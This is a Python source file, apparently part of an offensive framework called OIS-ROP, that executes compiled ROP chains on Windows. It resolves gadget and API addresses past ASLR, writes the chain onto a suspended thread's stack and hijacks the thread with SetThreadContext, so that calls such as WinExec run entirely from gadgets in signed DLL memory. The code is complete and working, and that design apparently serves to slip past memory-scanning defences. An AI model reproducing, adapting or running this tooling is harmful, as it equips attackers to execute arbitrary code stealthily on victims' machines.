#!/usr/bin/env python3
"""
OIS-ROP: Runtime Execution Bridge
===================================

Takes a CompiledChain from the chain compiler, resolves RVAs to
runtime virtual addresses (handling ASLR), patches string placeholders,
and executes via SetThreadContext.

Windows-only. This is the execution layer.

Author: Chris Aziz / Bombadil Systems
"""

import ctypes
import struct
import sys
import time
from typing import Dict, List, Optional, Tuple
from pathlib import Path

from .chain_compiler import CompiledChain, ChainEntry


# =============================================================================
# WINDOWS STRUCTURES
# =============================================================================

class M128A(ctypes.Structure):
    _fields_ = [("Low", ctypes.c_ulonglong), ("High", ctypes.c_longlong)]


class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", ctypes.c_ulonglong),
        ("P2Home", ctypes.c_ulonglong),
        ("P3Home", ctypes.c_ulonglong),
        ("P4Home", ctypes.c_ulonglong),
        ("P5Home", ctypes.c_ulonglong),
        ("P6Home", ctypes.c_ulonglong),
        ("ContextFlags", ctypes.c_ulong),
        ("MxCsr", ctypes.c_ulong),
        ("SegCs", ctypes.c_ushort),
        ("SegDs", ctypes.c_ushort),
        ("SegEs", ctypes.c_ushort),
        ("SegFs", ctypes.c_ushort),
        ("SegGs", ctypes.c_ushort),
        ("SegSs", ctypes.c_ushort),
        ("EFlags", ctypes.c_ulong),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
        ("FltSave", ctypes.c_ubyte * 512),
        ("VectorRegister", M128A * 26),
        ("VectorControl", ctypes.c_ulonglong),
        ("DebugControl", ctypes.c_ulonglong),
        ("LastBranchToRip", ctypes.c_ulonglong),
        ("LastBranchFromRip", ctypes.c_ulonglong),
        ("LastExceptionToRip", ctypes.c_ulonglong),
        ("LastExceptionFromRip", ctypes.c_ulonglong),
    ]


CONTEXT_FULL = 0x10000B
CREATE_SUSPENDED = 0x4
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_READWRITE = 0x04
INFINITE = 0xFFFFFFFF


# =============================================================================
# RUNTIME RESOLVER
# =============================================================================

class RuntimeResolver:
    """
    Resolves CompiledChain RVAs to runtime virtual addresses.

    The compiler outputs RVAs (relative to image base). At runtime,
    ASLR means each DLL loads at a different base. This resolver
    maps RVAs to absolute addresses using GetModuleHandleW.
    """

    def __init__(self):
        if sys.platform != 'win32':
            raise RuntimeError("RuntimeResolver requires Windows")

        self.kernel32 = ctypes.windll.kernel32
        self.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
        self.kernel32.LoadLibraryW.restype = ctypes.c_void_p

        self._module_bases: Dict[str, int] = {}

    def get_module_base(self, module_name: str) -> int:
        """Get the runtime base address of a loaded module."""
        if module_name not in self._module_bases:
            # Normalize name
            name = module_name
            if not name.lower().endswith('.dll'):
                name += '.dll'

            handle = self.kernel32.GetModuleHandleW(name)
            if not handle:
                handle = self.kernel32.LoadLibraryW(name)
            if not handle:
                raise RuntimeError(f"Cannot load module: {name}")

            self._module_bases[module_name] = handle
        return self._module_bases[module_name]

    def resolve_chain(
        self,
        chain: CompiledChain,
        modules: List[str],
    ) -> Tuple[List[int], Dict[int, str]]:
        """
        Resolve a CompiledChain to runtime addresses.

        Gadget entries: resolved via base + RVA (they're code offsets
        within the DLL's .text section, always correct).

        Target entries: resolved via GetProcAddress (handles forwarded
        exports like kernel32!ExitThread → ntdll!RtlExitUserThread).

        Returns:
            (resolved_values, string_map)
        """
        # Get module bases
        bases = {}
        for mod in modules:
            bases[mod] = self.get_module_base(mod)

        resolved = []
        for entry in chain.entries:
            if entry.role.startswith("target:"):
                # API call target — resolve via GetProcAddress
                # Role format: "target: kernel32.dll!WinExec"
                addr = self._resolve_target(entry.role)
                if addr:
                    resolved.append(addr)
                else:
                    # Fallback to base+RVA
                    rva = entry.value
                    base = self._find_base_for_rva(entry, rva, bases, modules)
                    resolved.append(base + rva)

            elif entry.role.startswith("gadget:"):
                # Gadget — resolve via base + RVA
                rva = entry.value
                base = self._find_base_for_rva(entry, rva, bases, modules)
                resolved.append(base + rva)

            else:
                # Data value — pass through
                resolved.append(entry.value)

        return resolved, dict(chain.strings)

    def _resolve_target(self, role: str) -> Optional[int]:
        """
        Resolve a target API from the role string via GetProcAddress.
        Handles forwarded exports correctly.

        Role format: "target: kernel32.dll!WinExec"
        """
        try:
            # Parse "target: module!function"
            target_part = role.split("target:")[-1].strip()
            if "!" not in target_part:
                return None

            module_part, func_name = target_part.split("!", 1)
            module_part = module_part.strip()

            # Get module handle
            if not module_part.lower().endswith('.dll'):
                module_part += '.dll'

            handle = self.kernel32.GetModuleHandleW(module_part)
            if not handle:
                handle = self.kernel32.LoadLibraryW(module_part)
            if not handle:
                return None

            # GetProcAddress resolves forwarded exports transparently
            self.kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
            self.kernel32.GetProcAddress.restype = ctypes.c_void_p
            addr = self.kernel32.GetProcAddress(handle, func_name.encode('ascii'))
            return addr

        except Exception:
            return None

    def _find_base_for_rva(
        self,
        entry: ChainEntry,
        rva: int,
        bases: Dict[str, int],
        modules: List[str],
    ) -> int:
        """Determine which module base to use for this RVA."""
        # Check source field for module path
        source = entry.source.lower() if entry.source else ""
        role = entry.role.lower()

        for mod in modules:
            mod_lower = mod.lower()
            mod_stem = Path(mod).stem.lower()

            if mod_lower in source or mod_stem in source:
                return bases[mod]
            if mod_lower in role or mod_stem in role:
                return bases[mod]

        # Fallback: check role for module name in "target: module!func" format
        if "target:" in role and "!" in role:
            target_mod = role.split("!")[0].split("target:")[-1].strip()
            for mod in modules:
                if Path(mod).stem.lower() in target_mod:
                    return bases[mod]

        # Last resort: use first module
        return bases[modules[0]]


# =============================================================================
# CHAIN EXECUTOR
# =============================================================================

class ChainExecutor:
    """
    Executes a resolved ROP chain via SetThreadContext.

    The chain is placed on a suspended thread's stack, RSP is set
    to the chain, and RIP is set to the first gadget. On resume,
    the CPU walks the chain through signed DLL gadgets.
    """

    def __init__(self):
        if sys.platform != 'win32':
            raise RuntimeError("ChainExecutor requires Windows")

        self.kernel32 = ctypes.windll.kernel32
        self._setup_ctypes()
        self.resolver = RuntimeResolver()

    def _setup_ctypes(self):
        self.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
        self.kernel32.LoadLibraryW.restype = ctypes.c_void_p
        self.kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        self.kernel32.GetProcAddress.restype = ctypes.c_void_p
        self.kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        self.kernel32.VirtualAlloc.restype = ctypes.c_void_p
        self.kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
        self.kernel32.VirtualFree.restype = ctypes.c_bool
        self.kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        self.kernel32.CreateThread.restype = ctypes.c_void_p
        self.kernel32.GetThreadContext.argtypes = [ctypes.c_void_p, ctypes.POINTER(CONTEXT)]
        self.kernel32.GetThreadContext.restype = ctypes.c_bool
        self.kernel32.SetThreadContext.argtypes = [ctypes.c_void_p, ctypes.POINTER(CONTEXT)]
        self.kernel32.SetThreadContext.restype = ctypes.c_bool
        self.kernel32.ResumeThread.argtypes = [ctypes.c_void_p]
        self.kernel32.ResumeThread.restype = ctypes.c_ulong
        self.kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
        self.kernel32.WaitForSingleObject.restype = ctypes.c_ulong
        self.kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
        self.kernel32.CloseHandle.restype = ctypes.c_bool
        self.kernel32.GetExitCodeThread.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
        self.kernel32.GetExitCodeThread.restype = ctypes.c_bool
        self.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
        self.kernel32.WriteProcessMemory.argtypes = [
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
        ]
        self.kernel32.WriteProcessMemory.restype = ctypes.c_bool

    def execute(
        self,
        chain: CompiledChain,
        modules: List[str],
        timeout_ms: int = 30000,
        verbose: bool = True,
    ) -> int:
        """
        Execute a compiled chain.

        Args:
            chain: CompiledChain from the chain compiler.
            modules: List of module names used (e.g., ["kernel32.dll", "ntdll.dll"]).
                     Must match what was used during compilation.
            timeout_ms: Maximum wait time in milliseconds.
            verbose: Print execution details.

        Returns:
            Thread exit code.
        """
        if chain.errors:
            raise RuntimeError(f"Chain has errors: {chain.errors}")

        log = print if verbose else lambda *a, **k: None

        log("=" * 70)
        log("OIS-ROP: Executing Compiled Chain")
        log("=" * 70)

        # Step 1: Resolve RVAs to runtime addresses
        log("\n[1] Resolving RVAs to runtime addresses...")
        resolved_values, string_map = self.resolver.resolve_chain(chain, modules)

        for mod in modules:
            base = self.resolver.get_module_base(mod)
            log(f"    {mod}: base = 0x{base:X}")

        # Step 2: Find a ret gadget for thread entry
        ret_addr = None
        for i, entry in enumerate(chain.entries):
            if "RET_SLED" in entry.role:
                ret_addr = resolved_values[i]
                break

        if ret_addr is None:
            # Find any ret in the first module
            h = self.resolver.get_module_base(modules[0])
            # Scan for 0xC3
            for off in range(0x1000, 0x100000):
                try:
                    b = ctypes.c_ubyte.from_address(h + off).value
                    if b == 0xC3:
                        ret_addr = h + off
                        break
                except:
                    continue

        log(f"    Thread entry (ret gadget): 0x{ret_addr:X}")

        # Step 3: Create suspended thread
        log("\n[2] Creating suspended thread...")
        thread_id = ctypes.c_ulong()
        thread_handle = self.kernel32.CreateThread(
            None, 0x10000, ret_addr, None, CREATE_SUSPENDED, ctypes.byref(thread_id)
        )

        if not thread_handle:
            raise RuntimeError(f"CreateThread failed: {ctypes.get_last_error()}")
        log(f"    Thread handle: 0x{thread_handle:X}, id: {thread_id.value}")

        try:
            # Step 4: Get thread context (to find its stack)
            ctx = CONTEXT()
            ctx.ContextFlags = CONTEXT_FULL

            if not self.kernel32.GetThreadContext(thread_handle, ctypes.byref(ctx)):
                raise RuntimeError(f"GetThreadContext failed: {ctypes.get_last_error()}")

            original_rsp = ctx.Rsp
            log(f"    Original RSP: 0x{original_rsp:X}")
            log(f"    Original RIP: 0x{ctx.Rip:X}")

            # Step 5: Build the payload (chain + strings) and compute addresses
            log("\n[3] Building runtime payload...")

            # Build string data
            string_data = b''
            string_offsets = {}  # placeholder → offset within string_data
            for placeholder, s in sorted(string_map.items()):
                string_offsets[placeholder] = len(string_data)
                encoded = s.encode('ascii') + b'\x00'
                while len(encoded) % 8 != 0:
                    encoded += b'\x00'
                string_data += encoded

            chain_qwords = len(resolved_values)
            chain_byte_size = chain_qwords * 8
            total_size = chain_byte_size + len(string_data)

            # Allocate writable scratch space for StackSlot arguments
            # (output pointers like lpNumberOfBytesWritten)
            scratch_size = 64  # Room for 8 StackSlots
            total_size += scratch_size

            # Place chain on the thread's stack
            # Payload grows UPWARD from new_rsp for total_size bytes.
            # It must fit entirely below original_rsp to avoid corrupting
            # the thread's TIB / OS structures above the initial stack pointer.
            # The old hardcoded 0x200 was too small for chains > 64 entries.
            reserve = total_size + 0x100  # payload + 256-byte safety buffer
            new_rsp = (original_rsp - reserve) & ~0xF

            # String data goes right after the chain
            string_base = new_rsp + chain_byte_size
            # Scratch space goes after string data
            scratch_base = new_rsp + chain_byte_size + len(string_data)

            # Patch string placeholders with actual addresses
            patched = list(resolved_values)
            for i, val in enumerate(patched):
                if val in string_offsets:
                    patched[i] = string_base + string_offsets[val]

            # Patch StackSlot placeholders with writable scratch addresses
            slot_count = 0
            for i, val in enumerate(patched):
                if (val & 0xFFFFFFFF00000000) == 0xDEAD510700000000:
                    patched[i] = scratch_base + (slot_count * 8)
                    slot_count += 1

            # Build final payload bytes
            payload = b''.join(struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF) for v in patched)
            payload += string_data
            payload += b'\x00' * scratch_size  # Writable scratch for StackSlots

            log(f"    Chain: {chain_qwords} QWORDs ({chain_byte_size} bytes)")
            log(f"    Strings: {len(string_data)} bytes")
            log(f"    Total payload: {len(payload)} bytes")
            log(f"    New RSP: 0x{new_rsp:X}")
            log(f"    String base: 0x{string_base:X}")

            # Step 6: Write payload to the thread's stack
            log("\n[4] Writing payload to thread stack...")
            ctypes.memmove(new_rsp, payload, len(payload))
            log(f"    Wrote {len(payload)} bytes to 0x{new_rsp:X}")

            # Verify write
            verify = (ctypes.c_ubyte * 8)()
            ctypes.memmove(verify, new_rsp, 8)
            first_qword = int.from_bytes(bytes(verify), 'little')
            log(f"    Verify first QWORD: 0x{first_qword:X}")

            # Step 7: Dump resolved chain
            log("\n[5] Resolved chain:")
            first_gadget_addr = None
            for i, (val, entry) in enumerate(zip(patched, chain.entries)):
                marker = ""
                if entry.role.startswith("gadget:") and first_gadget_addr is None:
                    first_gadget_addr = val
                    marker = "  ← RIP starts here"
                log(f"    [{i:3d}] 0x{val:016X}  # {entry.role}{marker}")

            # Step 8: Set thread context
            # RIP → first gadget address
            # RSP → points to the DATA the first gadget expects
            #
            # The first entry is a gadget (pop rcx; ret).
            # RIP should point to that gadget's address.
            # RSP should point to entry [1] (the value to pop).
            #
            # So: RIP = patched[0], RSP = new_rsp + 8

            log("\n[6] Setting thread context...")
            ctx.Rip = first_gadget_addr
            ctx.Rsp = new_rsp + 8  # Skip past the first gadget addr (RIP handles it)

            # Set RAX to a safe readable address (for the LOAD_RDX gadget
            # that does cmp byte ptr [rax - 9], cl)
            ctx.Rax = new_rsp + 0x100  # Middle of our payload — guaranteed readable

            log(f"    RIP: 0x{ctx.Rip:X} (first gadget)")
            log(f"    RSP: 0x{ctx.Rsp:X} (chain data)")
            log(f"    RAX: 0x{ctx.Rax:X} (safe readable for side-effect cmps)")

            if not self.kernel32.SetThreadContext(thread_handle, ctypes.byref(ctx)):
                raise RuntimeError(f"SetThreadContext failed: {ctypes.get_last_error()}")
            log("    Context set successfully")

            # Step 9: Execute
            log("\n" + "=" * 70)
            log("EXECUTING — all code runs in signed DLL image memory")
            log("=" * 70)
            log("    Resuming thread...")

            result = self.kernel32.ResumeThread(thread_handle)
            log(f"    ResumeThread returned: {result}")

            # Wait for completion
            wait_result = self.kernel32.WaitForSingleObject(thread_handle, timeout_ms)

            if wait_result == 0:
                log("    Thread completed")
            elif wait_result == 258:
                log("    Thread timed out")
            else:
                log(f"    WaitForSingleObject returned: {wait_result}")

            # Get exit code
            exit_code = ctypes.c_ulong()
            self.kernel32.GetExitCodeThread(thread_handle, ctypes.byref(exit_code))
            code = exit_code.value

            log(f"\n    Exit code: 0x{code:X} ({code})")

            if code == 0xC0000005:
                log("    CRASH: Access Violation — check gadget addresses and stack alignment")
            elif code == 0x99:
                log("    SUCCESS — chain completed with marker 0x99")
            elif code == 259:
                log("    Thread still active (STILL_ACTIVE)")
            else:
                log(f"    Exit code: {code}")

            # Give a moment for any UI (calc window) to appear
            time.sleep(2)

            return code

        finally:
            self.kernel32.CloseHandle(thread_handle)


# =============================================================================
# CONVENIENCE
# =============================================================================

def execute_chain(
    chain: CompiledChain,
    modules: List[str] = None,
    verbose: bool = True,
) -> int:
    """
    Execute a compiled chain. Convenience wrapper.

    Args:
        chain: CompiledChain from compile_chain().
        modules: Module names. Defaults to ["kernel32.dll", "ntdll.dll"].
        verbose: Print execution details.

    Returns:
        Thread exit code.
    """
    if modules is None:
        modules = ["kernel32.dll", "ntdll.dll"]

    executor = ChainExecutor()
    return executor.execute(chain, modules, verbose=verbose)
